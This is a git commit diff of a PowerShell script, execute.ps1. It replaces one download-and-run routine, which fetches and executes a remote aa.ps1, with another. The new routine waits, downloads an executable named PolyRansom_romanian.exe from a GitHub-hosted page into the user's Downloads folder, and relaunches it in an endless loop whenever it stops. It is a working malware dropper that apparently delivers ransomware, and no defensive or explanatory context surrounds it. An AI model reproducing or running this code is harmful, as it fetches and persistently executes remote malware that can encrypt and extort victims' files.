ee892256de2c3a7e1bf422b28eb2d994350a969f
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-06 11:13:50 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,10 +1,19 @@
-$url = "https://webntdev.github.io/apps/aa.ps1"
-$downloadPath = "$env:USERPROFILE\Downloads\aa.ps1"
-Invoke-WebRequest -Uri $url -OutFile $downloadPath
-Start-Sleep -Seconds 10
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
+$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
+$webClient = New-Object System.Net.WebClient
 
-if (Test-Path $downloadPath) {
-    Invoke-Expression -Command "& '$downloadPath'"
-} else {
-    Write-Host "$url"
+Start-Sleep -Seconds 60
+
+$webClient.DownloadFile($url, $downloadPath)
+
+function IsProcessRunning {
+    param([string]$processName)
+    return Get-Process -Name $processName -ErrorAction SilentlyContinue
+}
+
+while ($true) {
+    if (-not (IsProcessRunning "PolyRansom_romanian")) {
+        Start-Process -FilePath $downloadPath -Wait
+    }
+    Start-Sleep -Milliseconds 100
 }
